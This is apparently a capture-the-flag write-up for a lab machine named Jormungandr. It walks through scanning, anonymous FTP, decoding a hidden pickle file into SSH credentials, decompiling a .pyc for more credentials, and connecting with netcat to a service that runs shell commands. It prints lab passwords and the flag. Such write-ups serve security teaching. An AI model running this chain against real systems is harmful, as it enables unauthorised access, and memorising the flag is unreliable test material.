# Jormungandr — User Flag Write-Up


## 1. Reconnaissance

A full TCP scan was performed:

```bash
nmap -sC -sV -p- 10.10.0.5
```

Three ports were discovered:

```text
21/tcp   FTP     vsftpd 3.0.5
22/tcp   SSH     OpenSSH
7432/tcp Unknown custom service
```

FTP allowed anonymous authentication.



## 2. Anonymous FTP Enumeration

Connection:

```bash
ftp 10.10.0.5
```

Credentials:

```text
Username: anonymous
Password: [empty]
```

A normal listing revealed:

```text
poem.txt
```

However, using:

```text
ls -la
```

revealed an additional hidden file:

```text
.yggdrasil.cache
```

The file was downloaded:

```text
get .yggdrasil.cache
```

This demonstrates why hidden-file enumeration is important even when normal directory listings appear limited.



## 3. Analysing `.yggdrasil.cache`

The file contained a long sequence of binary digits:

```text
100000000000010010010101...
```

The bitstream was converted back into raw bytes.

The resulting header started with:

```text
80 04 95
```

This corresponds to a Python **Pickle Protocol 4** object.

Static inspection was performed with:

```bash
python3 -m pickletools yggdrasil.bin
```

The pickle contained shuffled key/value pairs such as:

```text
ssh_user0
ssh_user1
...
ssh_pass0
ssh_pass1
...
```

Reordering them by their numeric suffix reconstructed the SSH credentials:

```text
Username: fenrir
Password: I_will_kill_odin_during_ragnarok
```



## 4. Initial SSH Access

SSH access was obtained:

```bash
ssh fenrir@10.10.0.5
```

Verification:

```bash
whoami
```

Result:

```text
fenrir
```

The home directory contained an unusual Python bytecode file:

```text
/home/fenrir/mjollnir.pyc
```



## 5. Reverse Engineering `mjollnir.pyc`

The bytecode file was copied locally and decompiled:

```bash
uvx uncompyle6 mjollnir-original.pyc
```

The recovered source code showed that the custom TCP service running on port `7432` asked for credentials and then executed arbitrary shell commands.

Relevant logic:

```python
username = long_to_bytes(...)
password = long_to_bytes(...)
```

The integer values were converted back to bytes, revealing:

```text
Username: jormungandr
Password: Jag_ar_Jormungandr_midgardsormen
```

The service implementation also showed:

```python
subprocess.Popen(command, shell=True, ...)
```

Therefore, successful authentication gives command execution as the user running the service.



## 6. Access as Jormungandr

The custom service was accessed with Netcat:

```bash
nc 10.10.0.5 7432
```

Authentication:

```text
Username: jormungandr
Password: Jag_ar_Jormungandr_midgardsormen
```

The service responded:

```text
Successfully logged in!
C:\User\Jormungandr>
```

Running:

```bash
id
```

returned:

```text
uid=1001(jormungandr) gid=1001(jormungandr)
```

This confirmed command execution as `jormungandr`.



## 7. User Flag

The flag was located with:

```bash
find / -name user.txt 2>/dev/null
```

Result:

```text
/home/jormungandr/user.txt
```

Reading it:

```bash
cat /home/jormungandr/user.txt
```

returned:

```text
EPI{k0mi0_a0_5kUlDAD09Um}
```



## Attack Chain

```text
Nmap
  ↓
Anonymous FTP
  ↓
Hidden .yggdrasil.cache file
  ↓
Binary bitstream
  ↓
Python Pickle analysis
  ↓
Fenrir SSH credentials
  ↓
SSH access as fenrir
  ↓
mjollnir.pyc
  ↓
Python bytecode decompilation
  ↓
Jormungandr credentials
  ↓
TCP service on port 7432
  ↓
Command execution as jormungandr
  ↓
user.txt
```



## Key Lessons

- Always enumerate hidden files with `ls -la`.
- Encoded data should be identified before attempting exploitation.
- Python Pickle files can be inspected safely using `pickletools`.
- `.pyc` files can reveal application logic through bytecode decompilation.
- Custom network services should be reverse engineered instead of brute-forcing credentials.
- Source-code analysis can reveal authentication logic and command-execution functionality.
- Enumeration should precede exploitation.



## Tools Used

```text
nmap
ftp
ssh
nc
file
xxd
strings
Python
pickletools
uncompyle6
xdis
```



## Result

**User compromise:** SUCCESS

```text
User: jormungandr
Flag: EPI{k0mi0_a0_5kUlDAD09Um}
```
